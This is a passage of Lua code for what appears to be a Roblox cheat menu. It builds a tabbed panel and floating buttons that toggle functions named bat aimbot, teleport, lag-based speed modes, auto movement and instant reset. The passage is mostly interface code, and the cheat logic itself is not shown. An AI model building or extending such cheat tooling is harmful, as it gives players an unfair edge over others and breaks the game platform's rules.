    })
    hSepG.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,1), NumberSequenceKeypoint.new(0.12,0.05),
        NumberSequenceKeypoint.new(0.5,0), NumberSequenceKeypoint.new(0.88,0.05), NumberSequenceKeypoint.new(1,1)
    })
    -- Glow line behind separator
    local hSepGlow = Instance.new("Frame", main)
    hSepGlow.Size = UDim2.new(1,-30,0,6); hSepGlow.Position = UDim2.fromOffset(15,HEADER_H-2)
    hSepGlow.BackgroundColor3 = Color3.fromRGB(154, 62, 230); hSepGlow.BackgroundTransparency = 0.88
    hSepGlow.BorderSizePixel = 0; hSepGlow.ZIndex = 3
    Instance.new("UICorner", hSepGlow).CornerRadius = UDim.new(1,0)
    local hSepGlowG = Instance.new("UIGradient", hSepGlow)
    hSepGlowG.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,1), NumberSequenceKeypoint.new(0.2,0.3),
        NumberSequenceKeypoint.new(0.5,0), NumberSequenceKeypoint.new(0.8,0.3), NumberSequenceKeypoint.new(1,1)
    })

    local TAB_H   = 50
    local contentY = HEADER_H + 2
    local contentH = PANEL_H - contentY - TAB_H

    local contentArea = Instance.new("Frame", main)
    contentArea.Size = UDim2.new(1,0,0,contentH)
    contentArea.Position = UDim2.fromOffset(0, contentY)
    contentArea.BackgroundTransparency = 1; contentArea.BorderSizePixel = 0
    contentArea.ZIndex = 2; contentArea.ClipsDescendants = true

    local pages = buildGui_createScrollingPages(contentArea)
    local activePage    = nil
    local activeTabName = "Speed"
    local tabBtns       = {}

    -- Bottom separator
    local bSep = Instance.new("Frame", main)
    bSep.Size = UDim2.new(1,-14,0,2); bSep.Position = UDim2.new(0,7,1,-(TAB_H+1))
    bSep.BackgroundColor3 = C_HIGHLIGHT; bSep.BackgroundTransparency = 0.35
    bSep.BorderSizePixel = 0; bSep.ZIndex = 4
    Instance.new("UICorner", bSep).CornerRadius = UDim.new(1,0)
    local bSepG = Instance.new("UIGradient", bSep)
    bSepG.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,1), NumberSequenceKeypoint.new(0.18,0.1),
        NumberSequenceKeypoint.new(0.5,0), NumberSequenceKeypoint.new(0.82,0.1), NumberSequenceKeypoint.new(1,1)
    })

    -- Bottom tab bar
    local tabScroll = Instance.new("ScrollingFrame", main)
    tabScroll.Name = "TabBar"
    tabScroll.Position = UDim2.new(0,8,1,-(TAB_H-3))
    tabScroll.Size = UDim2.new(1,-16,0,TAB_H-6)
    tabScroll.BackgroundTransparency = 1; tabScroll.BorderSizePixel = 0
    tabScroll.ScrollBarThickness = 0
    tabScroll.Active = true
    tabScroll.ScrollingEnabled = true
    tabScroll.ClipsDescendants = true
    pcall(function() tabScroll.ScrollingDirection = Enum.ScrollingDirection.X end)
    tabScroll.CanvasSize = UDim2.new(0,0,0,0)
    tabScroll.AutomaticCanvasSize = Enum.AutomaticSize.X
    tabScroll.ElasticBehavior = Enum.ElasticBehavior.Never; tabScroll.ZIndex = 4
    local tLL = Instance.new("UIListLayout", tabScroll)
    tLL.FillDirection = Enum.FillDirection.Horizontal
    tLL.SortOrder = Enum.SortOrder.LayoutOrder
    tLL.Padding = UDim.new(0,2); tLL.VerticalAlignment = Enum.VerticalAlignment.Center
    local tPad = Instance.new("UIPadding", tabScroll)
    tPad.PaddingLeft = UDim.new(0,6); tPad.PaddingRight = UDim.new(0,6)
    tPad.PaddingTop = UDim.new(0,5); tPad.PaddingBottom = UDim.new(0,5)

    local function switchTab(name)
        local np = pages[name]
        if not np then return end
        if activeTabName == name and activePage == np then return end
        activeTabName = name
        -- Instantly hide old page so no bleed-through
        if activePage then
            activePage.Visible = false
            activePage.Position = UDim2.fromOffset(0, 0)
        end
        -- Show new page instantly (ScrollingFrame has no GroupTransparency)
        np.Visible = true
        np.CanvasPosition = Vector2.new(0, 0)
        activePage = np
        for tName,tData in pairs(tabBtns) do
            local active = (tName == name)
            TS_G:Create(tData.lbl,TweenInfo.new(0.14),{TextColor3=active and C_WHITE or C_GREY}):Play()
            TS_G:Create(tData.ul,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundTransparency=active and 0 or 1}):Play()
        end
    end

    local TAB_NAMES = {"Speed","Main","Move","Config","Keybinds"}
    for i,name in ipairs(TAB_NAMES) do
        local wrap = Instance.new("Frame", tabScroll)
        wrap.Size = UDim2.fromOffset(0, 40)
        wrap.ZIndex = 5
        wrap.AutomaticSize = Enum.AutomaticSize.X
        wrap.BackgroundTransparency = 1; wrap.LayoutOrder = i; wrap.BorderSizePixel = 0

        local btn = Instance.new("TextButton", wrap)
        btn.Size = UDim2.fromOffset(0, 30); btn.Position = UDim2.fromOffset(0,2)
        btn.AutomaticSize = Enum.AutomaticSize.X
        btn.BackgroundTransparency = 1; btn.Text = name
        btn.TextColor3 = (name=="Speed") and C_WHITE or C_GREY
        btn.Font = Enum.Font.GothamBold; btn.TextSize = 12
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Selectable = false
        btn.ZIndex = 6
        -- padding so text has breathing room
        local bPad = Instance.new("UIPadding", btn)
        bPad.PaddingLeft = UDim.new(0,8); bPad.PaddingRight = UDim.new(0,8)

        local ul = Instance.new("Frame", wrap)
        ul.AnchorPoint = Vector2.new(0.5,1)
        ul.Position = UDim2.new(0.5,0,1,0)
        ul.Size = UDim2.new(0.6,0,0,2.5)
        ul.BackgroundColor3 = C_HIGHLIGHT
        ul.BackgroundTransparency = (name=="Speed") and 0 or 1
        ul.BorderSizePixel = 0
        ul.ZIndex = 6
        Instance.new("UICorner", ul).CornerRadius = UDim.new(1,0)

        btn.Activated:Connect(function() switchTab(name) end)
        btn.MouseEnter:Connect(function()
            if activeTabName~=name then TS_G:Create(btn,TweenInfo.new(0.1),{TextColor3=C_WHITE}):Play() end
        end)
        btn.MouseLeave:Connect(function()
            if activeTabName~=name then TS_G:Create(btn,TweenInfo.new(0.12),{TextColor3=C_GREY}):Play() end
        end)
        tabBtns[name] = {lbl=btn, ul=ul}
    end

    buildSpeedTab(pages); buildMainTab(pages); buildMoveTab(pages); buildConfigTab(pages); buildKeybindsTab(pages)
    -- Una sola lista vertical: Speed Values, Modes, Counters, Display Mode,
    -- Player, Protection, Visuals, Character / Performance, Utility, Actions,
    -- Auto Path, Steal, Actions, General, Background, Management y Keybinds.
    local verticalPage = pages.Speed
    local nextOrder = 0
    for _, child in ipairs(verticalPage:GetChildren()) do
        if child:IsA("GuiObject") then
            nextOrder += 1
            child.LayoutOrder = nextOrder
        end
    end
    for _, pageName in ipairs({"Main", "Move", "Config", "Keybinds"}) do
        local sourcePage = pages[pageName]
        for _, child in ipairs(sourcePage:GetChildren()) do
            if not child:IsA("UIListLayout") and not child:IsA("UIPadding") then
                child.Parent = verticalPage
                if child:IsA("GuiObject") then
                    nextOrder += 1
                    child.LayoutOrder = nextOrder
                end
            end
        end
        sourcePage:Destroy()
    end
    verticalPage.Visible = true
    verticalPage.Size = UDim2.new(1, 0, 1, 0)
    contentArea.Size = UDim2.new(1, 0, 1, -contentY)
    tabScroll.Visible = false
    bSep.Visible = false
    activePage = pages["Speed"]; activePage.Visible = true

    -- HAVEN DUELS animation: scale in with a short Back easing and scale out
    -- with a compact Quart easing. No horizontal slide is used.
    local menuScale = S.mainGuiScaleObj
    local menuBaseScale = S.IS_TOUCH_DEVICE and S.phoneGuiScale or 1
    local menuClosedScale = menuBaseScale * 0.82
    S.menuTransitionToken = (S.menuTransitionToken or 0) + 1
    outer.Position = S.menuOpenPosition
    if menuScale then menuScale.Scale = menuClosedScale end
    outer.Visible = true
    S.menuTween = TS_G:Create(menuScale, TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Scale = menuBaseScale
    })
    S.menuTween:Play()

    local function showGui()
        S.menuTransitionToken = (S.menuTransitionToken or 0) + 1
        if S.menuTween then pcall(function() S.menuTween:Cancel() end) end
        outer.Visible = true
        if S.miniToggleButton then S.miniToggleButton.Visible = false end
        outer.Position = S.menuOpenPosition
        if menuScale then menuScale.Scale = menuClosedScale end
        S.menuTween = TS_G:Create(menuScale, TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Scale = menuBaseScale
        })
        S.menuTween:Play()
    end
    local function hideGui()
        S.menuTransitionToken = (S.menuTransitionToken or 0) + 1
        local transitionToken = S.menuTransitionToken
        if S.menuTween then pcall(function() S.menuTween:Cancel() end) end
        S.menuTween = TS_G:Create(menuScale, TweenInfo.new(0.16, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
            Scale = menuClosedScale
        })
        S.menuTween.Completed:Connect(function(playbackState)
            if transitionToken ~= S.menuTransitionToken or playbackState ~= Enum.PlaybackState.Completed then return end
            outer.Visible = false
            if menuScale then menuScale.Scale = menuBaseScale end
            if S.miniToggleButton then S.miniToggleButton.Visible = true end
        end)
        S.menuTween:Play()
    end
    closeBtn.MouseButton1Click:Connect(hideGui)
    S.miniToggleButton = buildGui_createMiniToggle(gui, showGui)
    S.miniToggleButton.Visible = false

    UIS.InputBegan:Connect(function(input, gpe)
        if input.UserInputType~=Enum.UserInputType.Keyboard and input.UserInputType~=Enum.UserInputType.Gamepad1 then return end
        local kc=input.KeyCode
        local function match(e) return kc==e.kb or (e.gp and kc==e.gp) end
        if gpe then
            if match(S.KB.GuiHide) then if outer.Visible then hideGui() else showGui() end end
            return
        end
        if match(S.KB.DropBrainrot) then task.spawn(runDropBrainrot)
        elseif match(S.KB.TPFlor) then runTPFloor()
        elseif match(S.KB.AutoLeft) then
            S.autoLeftEnabled=not S.autoLeftEnabled
            if S.autoLeftEnabled then
                if S.autoRightEnabled then S.autoRightEnabled=false; stopAutoRight(); if S.autoRightSetVisual then S.autoRightSetVisual(false) end end
                if S.batAimbotEnabled then setBatAimbot(false) end
                startAutoLeft()
            else stopAutoLeft() end
            if S.autoLeftSetVisual then S.autoLeftSetVisual(S.autoLeftEnabled) end
            S.restartMovement(); updateFloatingButtons(); saveConfig()
        elseif match(S.KB.AutoRight) then
            S.autoRightEnabled=not S.autoRightEnabled
            if S.autoRightEnabled then
                if S.autoLeftEnabled then S.autoLeftEnabled=false; stopAutoLeft(); if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end
                if S.batAimbotEnabled then setBatAimbot(false) end
                startAutoRight()
            else stopAutoRight() end
            if S.autoRightSetVisual then S.autoRightSetVisual(S.autoRightEnabled) end
            S.restartMovement(); updateFloatingButtons(); saveConfig()
        elseif match(S.KB.AutoBat) then setBatAimbot(not S.batAimbotEnabled)
        elseif match(S.KB.TpBat) then
            local enabled = not S.tpBatEnabled
            setTpBat(enabled)
            if S.tpBatSetVisual then S.tpBatSetVisual(enabled) end
            saveConfig()
        elseif match(S.KB.GuiHide) then if outer.Visible then hideGui() else showGui() end
        elseif match(S.KB.SpeedToggle) then S.toggleCarryMode(); S.restartMovement(); updateFloatingButtons(); saveConfig()
        elseif match(S.KB.LaggerToggle) then S.toggleLaggerMode(); S.restartMovement(); updateFloatingButtons(); saveConfig()
        elseif match(S.KB.InstaReset) then
            if _G.InstaReset and _G.InstaReset.Trigger then _G.InstaReset.Trigger() end
        end
    end)
end


-- ===========================
-- FLOATING BUTTON PANEL (white / grey theme)
-- ===========================
local function createFloatingButtonPanel()
    local panelGui = Instance.new("ScreenGui")
    panelGui.Name = "FloatingModeMenu"
    panelGui.DisplayOrder = 50
    panelGui.IgnoreGuiInset = true
    panelGui.ResetOnSpawn = false
    panelGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    panelGui.Parent = LP:WaitForChild("PlayerGui")
    S.floatingPanelGui = panelGui

    local layoutFrame = Instance.new("Frame")
    layoutFrame.Name = "ButtonLayout"
    layoutFrame.AnchorPoint = Vector2.new(1, 0)
    layoutFrame.Position = UDim2.new(0.79, 0, 0, 0)
    layoutFrame.Size = UDim2.fromOffset(0, 0)
    layoutFrame.BackgroundTransparency = 1
    layoutFrame.BorderSizePixel = 0
    layoutFrame.ClipsDescendants = false
    layoutFrame.Active = false
    layoutFrame.Selectable = false
    layoutFrame.Parent = panelGui
    S.floatingPanelFrame = layoutFrame
    -- El panel principal mueve juntos sus botones; TP BAT y RESET van en una
    -- capa independiente para poder moverlos por separado.
    -- Solo esta franja superior captura el arrastre; el resto queda libre.
    local dragHandle = Instance.new("Frame")
    dragHandle.Name = "FloatingPanelDragHandle"
    dragHandle.Size = UDim2.fromOffset(0, 48)
    dragHandle.Position = UDim2.fromOffset(0, 0)
    dragHandle.BackgroundTransparency = 1
    dragHandle.BorderSizePixel = 0
    dragHandle.Active = true
    dragHandle.Parent = layoutFrame
    makeDraggable(dragHandle, true, layoutFrame)

    local freeButtonLayer = Instance.new("Frame")
    freeButtonLayer.Name = "IndependentButtonLayer"
    freeButtonLayer.AnchorPoint = Vector2.new(1, 0)
    freeButtonLayer.Position = UDim2.new(0.79, 0, 0, 0)
    freeButtonLayer.Size = UDim2.fromOffset(0, 0)
    freeButtonLayer.BackgroundTransparency = 1
    freeButtonLayer.BorderSizePixel = 0
    freeButtonLayer.ClipsDescendants = false
    freeButtonLayer.Active = false
    freeButtonLayer.Selectable = false
    freeButtonLayer.Parent = panelGui

    local selectedName = "CARRY SPD"
    local buttons = {}
    local BLACK = Color3.fromRGB(1, 1, 4)
    local WHITE = Color3.fromRGB(255, 255, 255)

    local buttonDefinitions = {
        {name = "DROP BR",       displayText = "DROP\nBR",       column = 2, row = 0},
        {name = "AUTO LEFT",     displayText = "AUTO\nLEFT",     column = 3, row = 0},
        {name = "TP BAT",        displayText = "TP\nBAT",       column = 1, row = 1}, -- visual only; intentionally no action
        {name = "BAT AIMBOT",    displayText = "BAT\nAIMBOT",   column = 2, row = 1},
        {name = "AUTO RIGHT",    displayText = "AUTO\nRIGHT",    column = 3, row = 1},
        {name = "Reset",         displayText = "RESET",         column = 1, row = 2},
        {name = "TP DOWN",       displayText = "TP\nDOWN",       column = 2, row = 2},
        {name = "CARRY SPD",     displayText = "CARRY\nSPD",     column = 3, row = 2},
        {name = "NORMAL LAGGER", displayText = "NORMAL\nLAGGER", column = 2, row = 3},
        {name = "CARRY LAGGER",  displayText = "CARRY\nLAGGER",  column = 3, row = 3},
    }

    local function applyButtonStyle(info, isSelected)
        if isSelected then
            info.button.BackgroundColor3 = WHITE
            info.button.TextColor3 = Color3.fromRGB(18, 31, 28)
            info.gradient.Enabled = true
        else
            info.button.BackgroundColor3 = BLACK
            info.button.TextColor3 = WHITE
            info.gradient.Enabled = false
        end
    end

    local pressTweenInfo = TweenInfo.new(0.09, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local releaseTweenInfo = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    for _, definition in ipairs(buttonDefinitions) do
        local button = Instance.new("TextButton")
        button.Name = string.gsub(definition.name, "%s+", "")
        button.BackgroundColor3 = BLACK
        button.BorderSizePixel = 0
        button.AutoButtonColor = false
        button.Text = definition.displayText or definition.name
        button.TextColor3 = WHITE
        button.TextScaled = true
        button.TextWrapped = true
        button.Font = Enum.Font.GothamBold
        button.ZIndex = 2
        button.Parent = layoutFrame

        local buttonScale = Instance.new("UIScale")
        buttonScale.Parent = button
        local activeScaleTween
        local function animateScale(target, info)
            if activeScaleTween then activeScaleTween:Cancel() end
            activeScaleTween = TS_G:Create(buttonScale, info, {Scale = target})
            activeScaleTween:Play()
        end
        button.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                animateScale(0.92, pressTweenInfo)
            end
        end)
        button.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                animateScale(1, releaseTweenInfo)
            end
        end)

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.24, 0)
        corner.Parent = button
        local textLimit = Instance.new("UITextSizeConstraint")
        textLimit.MinTextSize = 10
        textLimit.MaxTextSize = 15
        textLimit.Parent = button
        local gradient = Instance.new("UIGradient")
        gradient.Name = "SelectedGradient"
        gradient.Enabled = false
        gradient.Rotation = 90
        gradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(0.56, Color3.fromRGB(224, 226, 225)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(76, 80, 80)),
        })
        gradient.Parent = button

        local isFreeButton = definition.name == "TP BAT" or definition.name == "Reset"
        local info = {button = button, gradient = gradient, name = definition.name, column = definition.column, row = definition.row, independent = isFreeButton, userMoved = false}
        table.insert(buttons, info)
        if isFreeButton then
            button.Parent = freeButtonLayer
            local saved = S.floatingFreeButtonPositions[definition.name]
            if type(saved) == "table" and type(saved.X) == "number" and type(saved.Y) == "number" then
                button.Position = UDim2.fromOffset(saved.X, saved.Y)
                info.userMoved = true
            end
            makeDraggable(button, true, button, function(target)
                info.userMoved = true
                S.floatingFreeButtonPositions[definition.name] = {X = target.Position.X.Offset, Y = target.Position.Y.Offset}
            end)
        end

        button.Activated:Connect(function()
            if info.name == "TP DOWN" then return end
            -- Los botones de velocidad controlan su propia luz después de cambiar
            -- el modo. No aplicar aquí el estilo genérico, porque este evento
            -- puede ejecutarse después del handler de acción y volver a encender
            -- Carry/Lagger al apagarlos con el segundo toque.
            local isModeButton = info.name == "CARRY SPD"
                or info.name == "NORMAL LAGGER"
                or info.name == "CARRY LAGGER"
                or info.name == "BAT AIMBOT"
                or info.name == "TP BAT"
            if isModeButton then return end
            selectedName = info.name
            for _, item in ipairs(buttons) do applyButtonStyle(item, item.name == selectedName) end
        end)
    end

    local function find(name)
        for _, info in ipairs(buttons) do
            if info.name == name then return info end
        end
    end
    local function flash(info, duration)
        if not info then return end
        applyButtonStyle(info, true)
        task.delay(duration or 0.35, function()
            if info.button and info.button.Parent then applyButtonStyle(info, false) end
        end)
    end
    local function canPress()
        -- Lock solo congela las posiciones; no bloquea las acciones.
        return not S._floatingPanelDragging
    end

    local drop = find("DROP BR")
    local autoLeft = find("AUTO LEFT")
    local tpBat = find("TP BAT")
    local bat = find("BAT AIMBOT")
    S.tpBatSetVisual = function(active)
        if tpBat and tpBat.button and tpBat.button.Parent then applyButtonStyle(tpBat, active == true) end
    end
    local autoRight = find("AUTO RIGHT")
    local reset = find("Reset")
    local tpDown = find("TP DOWN")
    local carry = find("CARRY SPD")
    local normalLagger = find("NORMAL LAGGER")
    local carryLagger = find("CARRY LAGGER")

    local function connectAction(info, action)
        info.button.Activated:Connect(function()
            if canPress() then action() end
        end)
    end
    connectAction(drop, function() flash(drop, 0.5); task.spawn(runDropBrainrot) end)
    connectAction(tpBat, function()
        -- TP BAT usa la logica completa: primer toque ON, segundo OFF.
        local enabled = not S.tpBatEnabled
        setTpBat(enabled)
        if S.tpBatSetVisual then S.tpBatSetVisual(enabled) else applyButtonStyle(tpBat, enabled) end
        saveConfig()
    end)
    connectAction(bat, function()
        local on = not S.batAimbotEnabled
        if on then
            if S.autoLeftEnabled then S.autoLeftEnabled = false; stopAutoLeft(); if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end
            if S.autoRightEnabled then S.autoRightEnabled = false; stopAutoRight(); if S.autoRightSetVisual then S.autoRightSetVisual(false) end end
        end
        setBatAimbot(on)
        -- BAT AIMBOT controla su propia luz: primer toque ON, segundo toque OFF.
        applyButtonStyle(bat, on)
        updateFloatingButtons()
    end)
    connectAction(autoLeft, function()
        local on = not S.autoLeftEnabled
        if on then
            if S.autoRightEnabled then S.autoRightEnabled = false; stopAutoRight() end
            if S.batAimbotEnabled then setBatAimbot(false) end
            S.autoLeftEnabled = true; startAutoLeft()
        else S.autoLeftEnabled = false; stopAutoLeft() end
        if S.autoLeftSetVisual then S.autoLeftSetVisual(on) end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end)
    connectAction(autoRight, function()
        local on = not S.autoRightEnabled
        if on then
            if S.autoLeftEnabled then S.autoLeftEnabled = false; stopAutoLeft() end
            if S.batAimbotEnabled then setBatAimbot(false) end
            S.autoRightEnabled = true; startAutoRight()
        else S.autoRightEnabled = false; stopAutoRight() end
        if S.autoRightSetVisual then S.autoRightSetVisual(on) end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end)
    connectAction(reset, function() flash(reset, 0.5); if _G.InstaReset and _G.InstaReset.Trigger then _G.InstaReset.Trigger() end end)
    connectAction(tpDown, function()
        applyButtonStyle(tpDown, true)
        runTPFloor()
        task.delay(0.45, function()
            if tpDown and tpDown.button and tpDown.button.Parent then applyButtonStyle(tpDown, false) end
        end)
    end)
    local function refreshLaggerButtons()
        applyButtonStyle(normalLagger, S.laggerMode == 1 and not S.speedMode)
        applyButtonStyle(carryLagger, S.laggerMode == 2 and not S.speedMode)
    end

    -- Deja los tres botones de velocidad apagados y vuelve siempre a S.NS.
    -- Esto se usa al dar el segundo toque al botón que ya está activo.
    local function returnToNormalSpeed()
        S.setNormalSpeedMode()
        S.restartMovement()
        updateFloatingButtons()
        applyButtonStyle(carry, false)
        applyButtonStyle(normalLagger, false)
        applyButtonStyle(carryLagger, false)
        saveConfig()
    end

    connectAction(carry, function()
        -- Segundo toque en Carry: apagar Carry y volver a Normal Speed.
        if S.speedMode and S.laggerMode == 0 then
            returnToNormalSpeed()
            return
        end

        -- Primer toque (o cambio desde un modo Lagger): activar Carry.
        S.setCarrySpeedMode()
        S.restartMovement()
        updateFloatingButtons()
        refreshLaggerButtons()
        applyButtonStyle(normalLagger, false)
        applyButtonStyle(carryLagger, false)
        saveConfig()
    end)

    local function setLaggerSpeedMode(mode)
        -- Segundo toque en el mismo botón Lagger: apagarlo y volver a Normal.
        if S.laggerMode == mode and not S.speedMode then
            returnToNormalSpeed()
            return
        end

        -- Primer toque, o cambio entre Normal Lagger y Carry Lagger.
        S.speedMode = false
        S.laggerMode = mode
        S.refreshSpeedModeLabel()
        S.applySpeedVelocityNow()
        S.restartMovement()
        updateFloatingButtons()
        refreshLaggerButtons()
        saveConfig()
    end

    connectAction(normalLagger, function() setLaggerSpeedMode(1) end) -- S.LS: Lagger Normal Speed
    connectAction(carryLagger, function() setLaggerSpeedMode(2) end) -- S.LCS: Lagger Carry Speed

    S.dropBrainrotSetVisual = function(active) applyButtonStyle(drop, active) end
    S.dropBrainrotFloatVisual = S.dropBrainrotSetVisual
    -- Reset remains highlighted only while its action is running; respawn clears it.
    LP.CharacterAdded:Connect(function()
        task.defer(function()
            if reset and reset.button and reset.button.Parent then applyButtonStyle(reset, false) end
            if drop and drop.button and drop.button.Parent then applyButtonStyle(drop, false) end
        end)
    end)
    S._btnAAL, S._bsAAL, S._l1AAL, S._l2AAL = autoLeft.button, nil, nil, nil
    S._btnAAR, S._bsAAR, S._l1AAR, S._l2AAR = autoRight.button, nil, nil, nil
    S._btnBAT, S._bsBAT, S._l1BAT, S._l2BAT = bat.button, nil, nil, nil
    S._setPButtonActive = function(button, _, _, _, active)
        for _, info in ipairs(buttons) do
            if info.button == button then
                applyButtonStyle(info, active)
                return
            end
        end
    end
    S._floatingButtons = {
        lagger = normalLagger.button,
        l2Lagger = {Text = ""},
        carry = carry.button,
        autoLeft = autoLeft.button,
        autoRight = autoRight.button,
        bat = bat.button,
    }

    local function updateLayout()
        local camera = workspace.CurrentCamera
        if not camera then return end
        local viewport = camera.ViewportSize
        local isLandscape = viewport.X > viewport.Y
        local sizeFactor = isLandscape and 0.16 or 0.18
        local buttonSize = math.floor(math.min(viewport.Y * sizeFactor, viewport.X * 0.24))
        local gap = math.max(8, math.floor(buttonSize * 0.14))
        local pitch = buttonSize + gap
        -- No reposicionar aquí: el usuario puede haber guardado o movido el panel.
        local firstRowY = math.floor(viewport.Y * (isLandscape and 0.18 or 0.205))
        -- Las capas solo cubren el rectángulo de los botones; no toda la pantalla.
        local groupHeight = firstRowY + buttonSize * 4 + gap * 3 + gap
        local groupWidth = buttonSize * 4 + gap * 3
        layoutFrame.Size = UDim2.fromOffset(groupWidth, groupHeight)
        freeButtonLayer.Size = UDim2.fromOffset(groupWidth, groupHeight)
        dragHandle.Size = UDim2.fromOffset(groupWidth, math.max(48, firstRowY))
        for _, info in ipairs(buttons) do
            info.button.Size = UDim2.fromOffset(buttonSize, buttonSize)
            if not info.independent or not info.userMoved then
                info.button.Position = UDim2.fromOffset(info.column * pitch, firstRowY + info.row * pitch)
            end
        end
    end
    local cameraConnection
    local function bindCamera()
        if cameraConnection then cameraConnection:Disconnect() end
        local camera = workspace.CurrentCamera
        if camera then
            cameraConnection = camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateLayout)
            updateLayout()
        end
    end
    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(bindCamera)
    bindCamera()
    S._floatingButtonInfos = buttons
    S._floatingFreeButtonLayer = freeButtonLayer
    S._floatingUpdateLayout = updateLayout
    if S._savedFloatingPanelPos then
        local pos = S._savedFloatingPanelPos
        layoutFrame.Position = UDim2.new(pos.XS or 0.79, pos.X or 0, pos.YS or 0, pos.Y or 0)
    end
    for _, info in ipairs(buttons) do applyButtonStyle(info, false) end
    applyButtonStyle(carry, S.speedMode and S.laggerMode == 0)
    applyButtonStyle(normalLagger, S.laggerMode == 1 and not S.speedMode)
    applyButtonStyle(carryLagger, S.laggerMode == 2 and not S.speedMode)
    applyButtonStyle(autoLeft, S.autoLeftEnabled)
    applyButtonStyle(autoRight, S.autoRightEnabled)
    applyButtonStyle(bat, S.batAimbotEnabled)
    applyButtonStyle(tpBat, S.tpBatEnabled)
end

-- ===========================
-- FLOATING BUTTON PANEL (Vision Hub layout, fully wired)
-- ===========================
createFloatingButtonPanel = function()
    local gui = Instance.new("ScreenGui")
    gui.Name = "FloatingModeMenu"
    gui.DisplayOrder = 50
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = LP:WaitForChild("PlayerGui")
    S.floatingPanelGui = gui

    local container = Instance.new("Frame")
    container.Name = "FloatingButtons"
    container.AnchorPoint = Vector2.new(1, 0)
    container.Position = UDim2.new(1, -58, 0, 95)
    container.Size = UDim2.fromOffset(216, 270)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ZIndex = 10
    container.Parent = gui
    S.floatingPanelFrame = container

    local DARK = Color3.fromRGB(5, 5, 7)
    local TEXT = Color3.fromRGB(255, 255, 255)
    local STROKE = Color3.fromRGB(18, 18, 24)
    local ACTIVE_BASE = Color3.fromRGB(218, 155, 255)
    local ACTIVE_TOP = Color3.fromRGB(255, 230, 255)
    local ACTIVE_MIDDLE = Color3.fromRGB(218, 155, 255)
    local ACTIVE_BOTTOM = Color3.fromRGB(154, 62, 230)
    local ACTIVE_STROKE = Color3.fromRGB(190, 120, 255)
    local byId, infos = {}, {}
    local positions = {
        {"Drop", "DROP\nBRAINROT", 72, 0}, {"AutoLeft", "AUTO\nLEFT", 144, 0},
        {"InstaReset", "INSTANT\nRESET", 0, 60}, {"AutoBat", "BAT\nAIMBOT", 72, 60},
        {"BatUp", "TP\nBAT", 0, 120}, {"AutoRight", "AUTO\nRIGHT", 144, 60},
        {"TPDown", "TP\nDOWN", 72, 120}, {"CarrySpd", "CARRY\nSPD", 144, 120},
        {"LaggerCarry", "LAGGER\nCARRY", 72, 180}, {"LaggerNormal", "LAGGER\nNORMAL", 144, 180},
    }
    local function style(i, active)
        if not i or not i.button or not i.button.Parent then return end
        i.active = active == true
        i.button.BackgroundColor3 = i.active and ACTIVE_BASE or DARK
        i.gradient.Enabled = true
        i.gradient.Color = i.active and ColorSequence.new({
            ColorSequenceKeypoint.new(0, ACTIVE_TOP),
            ColorSequenceKeypoint.new(0.46, ACTIVE_MIDDLE),
            ColorSequenceKeypoint.new(1, ACTIVE_BOTTOM),
        }) or ColorSequence.new(DARK)
        i.stroke.Color = i.active and ACTIVE_STROKE or STROKE
        i.stroke.Transparency = i.active and 0 or 0.25
        i.stroke.Thickness = i.active and 2 or 1
        i.hit.TextColor3 = TEXT
    end
    local function flash(i, duration)
        style(i, true)
        task.delay(duration or 0.45, function()
            if i and i.button and i.button.Parent then style(i, false) end
        end)
    end
    for _, p in ipairs(positions) do
        local button = Instance.new("Frame")
        button.Name = "VisualButton_" .. p[1]
        button.Position = UDim2.fromOffset(p[3], p[4])
        button.Size = UDim2.fromOffset(60, 50)
        button.BackgroundColor3 = DARK
        button.BorderSizePixel = 0
        button.ZIndex = 11
        button.Parent = container
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 10)
        corner.Parent = button
        local stroke = Instance.new("UIStroke")
        stroke.Name = "Border"
        stroke.Color = STROKE
        stroke.Transparency = 0.25
        stroke.Thickness = 1
        stroke.Parent = button
        local gradient = Instance.new("UIGradient")
        gradient.Name = "SelectedGradient"
        gradient.Rotation = 90
        gradient.Parent = button
        local hit = Instance.new("TextButton")
        hit.Name = "TextAndTouch"
        hit.Size = UDim2.fromScale(1, 1)
        hit.BackgroundTransparency = 1
        hit.BorderSizePixel = 0
        hit.AutoButtonColor = false
        hit.Text = p[2]
        hit.TextColor3 = TEXT
        hit.TextSize = 8
        hit.Font = Enum.Font.GothamBlack
        hit.TextWrapped = true
        hit.ZIndex = 13
        hit.Parent = button
        local buttonScale = Instance.new("UIScale")
        buttonScale.Name = "PressAnimationScale"
        buttonScale.Scale = 1
        buttonScale.Parent = button
        local activeScaleTween
        local pressTween = TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local bounceTween = TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        hit.InputBegan:Connect(function(input)
